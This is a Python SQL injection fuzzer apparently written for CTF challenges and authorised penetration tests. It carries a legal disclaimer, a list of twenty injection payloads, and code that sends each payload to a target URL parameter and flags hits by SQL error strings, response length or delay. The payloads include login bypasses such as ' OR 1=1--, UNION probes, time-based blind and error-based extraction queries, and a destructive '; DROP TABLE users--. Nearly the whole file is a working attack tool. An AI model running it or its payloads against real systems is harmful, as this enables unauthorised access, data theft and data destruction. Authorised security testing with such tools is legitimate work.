#!/usr/bin/env python3
"""
sql_fuzz.py — SQL injection payload fuzzer for CTF / authorised pentests
Samson Ram | https://github.com/samram77-art

DISCLAIMER: This tool is intended for use ONLY against systems you own or have
explicit written authorisation to test. Unauthorised use against systems without
permission is illegal under the Computer Fraud and Abuse Act (CFAA), the Computer
Misuse Act (UK), and equivalent legislation worldwide. The author accepts no
responsibility for misuse.

Usage:
    python sql_fuzz.py --url http://challenge.htb/login --param username
    python sql_fuzz.py --url http://target/search --param q --method GET
    python sql_fuzz.py --url http://target/login --param user --method POST \
                       --cookies "session=abc123; csrf=xyz"
"""

import argparse
import time
import requests
from urllib.parse import urlencode

# Suppress SSL warnings for self-signed certs common in CTF environments
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Payload list ────────────────────────────────────────────────────────────
SQLI_PAYLOADS: list[tuple[str, str]] = [
    # (payload, description)
    ("'",                          "Single quote — syntax error probe"),
    ("''",                         "Double single quote — escaping probe"),
    ("`",                          "Backtick — MySQL identifier quote probe"),
    ("\"",                         "Double quote — MSSQL/SQLite probe"),
    ("' OR 1=1--",                 "Classic OR true — MySQL/MSSQL"),
    ("' OR 1=1#",                  "Classic OR true — MySQL hash comment"),
    ("' OR '1'='1",                "OR string equality — no comment needed"),
    ("admin'--",                   "Admin bypass — comment out password check"),
    ("admin' #",                   "Admin bypass — MySQL hash comment"),
    ("' OR 'x'='x",               "OR with string comparison"),
    ("1' OR '1'='1'--",           "Numeric field injection attempt"),
    ("' OR 1=1 LIMIT 1--",        "OR true with LIMIT"),
    ("'; DROP TABLE users--",      "Stacked query test (destructive — observe only)"),
    ("' UNION SELECT NULL--",      "UNION probe — 1 column"),
    ("' UNION SELECT NULL,NULL--", "UNION probe — 2 columns"),
    ("' AND SLEEP(3)--",           "Time-based blind SQLi — MySQL"),
    ("'; WAITFOR DELAY '0:0:3'--", "Time-based blind SQLi — MSSQL"),
    ("' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
                                   "MSSQL error-based extraction"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                                   "MySQL error-based extraction"),
    ("' OR SLEEP(3) AND '1'='1",  "Time-based in string context — MySQL"),
]

# Strings that suggest SQL errors leaked in the response
ERROR_INDICATORS: list[str] = [
    "sql syntax", "syntax error", "mysql_fetch", "ORA-", "PG::", "sqlite",
    "unclosed quotation", "quoted string not properly terminated",
    "microsoft ole db", "odbc drivers", "warning: mysql", "supplied argument",
    "division by zero", "invalid query", "pg_query", "pg_exec",
    "unterminated string", "sqlstate", "db2 sql error", "you have an error",
]


def parse_cookies(cookie_str: str) -> dict[str, str]:
    """Parse a 'key=val; key2=val2' cookie string into a dict."""
    cookies = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            cookies[k.strip()] = v.strip()
    return cookies


def send_request(
    session: requests.Session,
    url: str,
    param: str,
    payload: str,
    method: str,
    baseline_len: int,
) -> tuple[bool, str, int, float]:
    """
    Send a single request with the given payload.
    Returns (triggered, reason, response_length, elapsed_seconds).
    """
    data = {param: payload}
    start = time.monotonic()

    try:
        if method == "POST":
            resp = session.post(url, data=data, timeout=10, verify=False)
        else:
            resp = session.get(url, params=data, timeout=10, verify=False)
    except requests.exceptions.Timeout:
        elapsed = time.monotonic() - start
        return True, "TIMEOUT (possible time-based blind SQLi)", 0, elapsed
    except requests.exceptions.RequestException as e:
        return False, f"Request error: {e}", 0, 0.0

    elapsed = time.monotonic() - start
    body_lower = resp.text.lower()
    resp_len = len(resp.text)

    # Check 1: SQL error keywords in response body
    for indicator in ERROR_INDICATORS:
        if indicator in body_lower:
            return True, f"SQL error keyword: '{indicator}'", resp_len, elapsed

    # Check 2: Significant response length difference from baseline
    length_diff = abs(resp_len - baseline_len)
    if baseline_len > 0 and length_diff > max(50, baseline_len * 0.15):
        return True, f"Response length changed: {baseline_len} → {resp_len} (Δ{length_diff})", resp_len, elapsed

    # Check 3: Suspicious time delay (time-based blind)
    if elapsed >= 2.5:
        return True, f"Suspicious delay: {elapsed:.2f}s (possible time-based blind)", resp_len, elapsed

    return False, "no anomaly", resp_len, elapsed


def get_baseline(session: requests.Session, url: str, param: str, method: str) -> int:
    """Send a benign request to establish a response length baseline."""
    benign_payload = "testuser"
    try:
        if method == "POST":
            resp = session.post(url, data={param: benign_payload}, timeout=10, verify=False)
        else:
            resp = session.get(url, params={param: benign_payload}, timeout=10, verify=False)
        return len(resp.text)
    except Exception:
        return 0


def main():
    parser = argparse.ArgumentParser(
        description="SQL injection payload fuzzer — authorised use only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python sql_fuzz.py --url http://challenge.htb/login --param username",
    )
    parser.add_argument("--url",     required=True, help="Target URL (e.g. http://target/login)")
    parser.add_argument("--param",   required=True, help="Parameter name to inject into")
    parser.add_argument("--method",  default="POST", choices=["GET", "POST"],
                        help="HTTP method (default: POST)")
    parser.add_argument("--cookies", default="",
                        help="Cookies as 'key=val; key2=val2' string")
    args = parser.parse_args()

    print("=" * 65)
    print("  sql_fuzz.py — SQL Injection Fuzzer")
    print("  FOR AUTHORISED TESTING ONLY")
    print("=" * 65)
    print(f"  Target  : {args.url}")
    print(f"  Param   : {args.param}")
    print(f"  Method  : {args.method}")
    print(f"  Payloads: {len(SQLI_PAYLOADS)}")
    print("=" * 65 + "\n")

    session = requests.Session()
    session.headers.update({"User-Agent": "CTF-SQLFuzzer/1.0"})
    if args.cookies:
        session.cookies.update(parse_cookies(args.cookies))

    # Baseline
    baseline_len = get_baseline(session, args.url, args.param, args.method)
    print(f"[*] Baseline response length: {baseline_len} bytes\n")

    triggered = []

    for i, (payload, description) in enumerate(SQLI_PAYLOADS, 1):
        hit, reason, resp_len, elapsed = send_request(
            session, args.url, args.param, payload, args.method, baseline_len
        )
        status = "[HIT]" if hit else "     "
        print(f"  {status} [{i:02d}] {repr(payload):<45} {elapsed:.2f}s  len={resp_len}")
        if hit:
            print(f"           └─ {reason}")
            triggered.append((payload, description, reason))

    # Summary
    print(f"\n{'=' * 65}")
    print(f"  Results: {len(triggered)} / {len(SQLI_PAYLOADS)} payloads triggered an anomaly\n")
    if triggered:
        print("  Triggered payloads:")
        for payload, desc, reason in triggered:
            print(f"    • {repr(payload)}")
            print(f"      {desc}")
            print(f"      Reason: {reason}\n")
    else:
        print("  No anomalies detected. The parameter may not be injectable,")
        print("  or responses are normalised. Consider manual testing.")
    print("=" * 65)


if __name__ == "__main__":
    main()
